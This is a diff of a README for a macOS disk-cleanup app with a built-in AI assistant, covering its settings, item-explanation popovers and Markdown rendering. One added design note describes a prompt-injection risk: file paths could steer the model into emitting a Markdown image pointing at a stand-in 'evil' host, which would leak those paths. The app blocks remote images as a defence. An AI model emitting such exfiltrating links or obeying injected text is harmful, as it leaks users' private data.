@@ -38,7 +38,7 @@ Eleven screens in a sidebar, plus a persistent menu-bar item and an AI assistant
 | Android emulators | AVDs in `~/.android/avd`; deletion also clears the `.ini` pointer |
 | Temp files | Top-level entries in `/private/tmp` and `$TMPDIR` (safety rules and limits below) |
 | Dev daemons | Memory and swap metrics; terminate long-running dev daemons (Gradle, Kotlin) |
-| Settings | AI agent provider connection (provider, API root URL, model, API key) |
+| Settings | AI provider connection (provider, API root URL, model, API key), local CLI provider opt-in, window behavior (always on top) |
 
 The menu-bar item shows SSD usage, refreshed every 60 seconds. Clicking it opens a minimal dropdown with a gauge plus Open / Quit.
 
@@ -60,6 +60,10 @@ The speech-bubble toolbar button opens a panel on the right. It answers **from t
 | OpenAI-compatible (custom) | you provide | Chat Completions |
 
 The app appends the version path (`/v1/messages`, `/v1/chat/completions`). Enter the root only; a trailing slash, a `/v1`, or a full endpoint path copied from the docs is absorbed.
+
+### Item explanation button (ⓘ)
+
+Every list row has an ⓘ button that opens a popover explaining what the item is and whether it is safe to delete. **Items the app already knows are never sent to AI** — most listed paths were put there by the app itself (e.g. `~/.gradle/caches`), so asking a model to guess their identity is slower, costlier and less accurate. Entries in `KnownItemCatalog` (DerivedData, Archives, DeviceSupport, Gradle caches, …) show instantly with no AI configured; only unfamiliar paths in the large-file and temp-file tabs and unknown processes go to the model. Answers are cached, so pressing the same item again does not re-ask.
 
 **Models are picked from a dropdown.** The settings screen fetches `GET /v1/models` when it opens (both wire formats return the same shape). Embedding, speech, image and moderation models are filtered out — picking one only produces a failure. Turn on **직접 입력** (manual entry) for names that are not in the list, such as an internal gateway or a preview model. Listing does not require a model name; not knowing the name is the reason to list.
 
@@ -105,7 +109,7 @@ Setup: log in once in a terminal, then put the output of `which claude` (or `whi
 
 Requests are never sent over plaintext `http` to a remote host (key exposure). `http` is allowed for loopback (`localhost`, `127.0.0.1`, `::1`), and for `*.local` LAN addresses **only with providers that need no API key**.
 
-Answers render as Markdown — only what models actually emit (bold, italic, inline code, bullets, numbered lists, headings, fenced code), with inline formatting delegated to Foundation's `AttributedString(markdown:)`. Half-arrived syntax during streaming (`**bold`) and unterminated code fences never drop characters. Messages you type stay verbatim, so a `*` you wrote is not eaten as formatting.
+Answers render with [MarkdownView](https://github.com/LiYanan2004/MarkdownView) — chosen for incremental streaming parsing and text selection across blocks — with two defaults changed. **Remote images are never fetched**: file paths in the screen snapshot could steer the model into emitting `![](https://evil/?p=...)`, which would leak the path the moment the answer renders. **Syntax highlighting and math rendering are off**: the library's default style locates resources via `Bundle.module`, and in an ad-hoc-signed app shipping that bundle in the `.app` root breaks codesigning while omitting it crashes on other machines (measured). Messages you type stay verbatim, so a `*` you wrote is not eaten as formatting.
 
 Answers are capped at 1024 tokens. When the cap truncates a reply, the app appends `(답변이 길이 제한으로 잘렸습니다.)` — a truncated answer must not read as a complete one.
 
@@ -162,7 +166,7 @@ Three more guards apply:
 ## Requirements
 
 - macOS 14 or later
-- Xcode 16 or later (Swift Testing)
+- Xcode 26 or later — the MarkdownView 3.0.0 dependency requires the Swift 6.2 toolchain (tests use Swift Testing)
 - macOS will prompt for file access (TCC) to `~/Documents`, `~/Downloads`, etc. on first run
 
 ## Running
